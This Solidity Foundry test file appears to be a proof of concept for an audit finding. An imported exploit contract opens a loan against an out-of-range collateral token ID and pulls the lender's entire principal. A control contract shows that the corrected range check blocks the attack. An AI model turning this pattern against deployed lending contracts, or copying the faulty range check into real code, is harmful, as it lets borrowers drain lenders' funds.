// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Terms,
    Asset,
    OraclePoolOfferHandler
} from "./35264-h-03-oraclepoolofferhandler-has-an-invalid-check-on-collater.sol";

/// Same principal math. The range test uses ||, so token 999 reverts and nothing is pulled.
contract GuardedHandler {
    uint256 public rangeMin;
    uint256 public rangeMax;
    uint256 public floorValue;
    uint256 public factorBps;
    error InvalidInputError();
    error InvalidPrincipalAmountError();

    function configure(uint256 minId, uint256 maxId, uint256 floor, uint256 factor) external {
        rangeMin = minId;
        rangeMax = maxId;
        floorValue = floor;
        factorBps = factor;
    }

    function validateOffer(uint256 _collateralTokenId, uint256 amount) external view returns (uint256, uint256) {
        if (_collateralTokenId < rangeMin || _collateralTokenId > rangeMax) {
            revert InvalidInputError();
        }
        uint256 cap = floorValue * factorBps / 10_000;
        if (amount > cap) revert InvalidPrincipalAmountError();
        return (amount, cap);
    }
}

contract GuardedLoan {
    Asset public asset;
    GuardedHandler public handler;
    address public lender;
    address public borrower;
    uint256 public collateralTokenId;
    uint256 public pulled;

    constructor(Asset _asset, GuardedHandler _handler, address _lender) {
        asset = _asset;
        handler = _handler;
        lender = _lender;
        borrower = msg.sender;
    }

    function emitLoan(uint256 tokenId, uint256 amount) external returns (uint256) {
        (uint256 principal,) = handler.validateOffer(tokenId, amount);
        collateralTokenId = tokenId;
        asset.transferFrom(lender, borrower, principal);
        pulled = principal;
        return collateralTokenId;
    }
}

contract Finding35264Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // Token-profit replay probes balanceOf before deploy, so the attacker nonce is 1.
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant HANDLER = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;
    address constant LOAN = 0xce01759B82FD6cbf9DA468ae79fdcACc4605a5c5;

    function test_bad_id_pulls_lender_principal() public {
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        Exploit e = new Exploit();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.asset()), TOKEN, "token");
        assertEq(address(e.handler()), HANDLER, "handler");
        assertEq(address(e.loan()), LOAN, "loan");
        e.run();

        emit log_named_uint("opened token id", e.openedId());
        emit log_named_uint("pulled", e.pulled());
        emit log_named_uint("cap", e.capUsed());

        assertEq(e.openedId(), Terms.BAD_ID, "nft");
        assertGt(e.openedId(), Terms.MAX_ID, "outside");
        assertEq(e.pulled(), Terms.PRINCIPAL, "pulled");
        assertEq(e.asset().balanceOf(address(e)), Terms.PRINCIPAL, "borrower");
        assertEq(e.asset().balanceOf(Terms.LENDER), 0, "lender");
    }

    function test_control_rejects_id_and_pulls_zero() public {
        Asset asset = new Asset();
        GuardedHandler handler = new GuardedHandler();
        GuardedLoan loan = new GuardedLoan(asset, handler, Terms.LENDER);
        handler.configure(Terms.MIN_ID, Terms.MAX_ID, Terms.FLOOR, Terms.FACTOR_BPS);
        asset.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);

        vm.expectRevert(GuardedHandler.InvalidInputError.selector);
        loan.emitLoan(Terms.BAD_ID, Terms.PRINCIPAL);

        assertEq(loan.pulled(), 0, "pulled");
        assertEq(loan.collateralTokenId(), 0, "nft");
        assertEq(asset.balanceOf(Terms.LENDER), Terms.PRINCIPAL, "lender kept funds");
        assertEq(asset.balanceOf(address(this)), 0, "borrower");

        uint256 id = loan.emitLoan(Terms.MIN_ID, Terms.PRINCIPAL);
        assertEq(id, Terms.MIN_ID, "in range");
        assertEq(loan.pulled(), Terms.PRINCIPAL, "in range pull");
    }
}
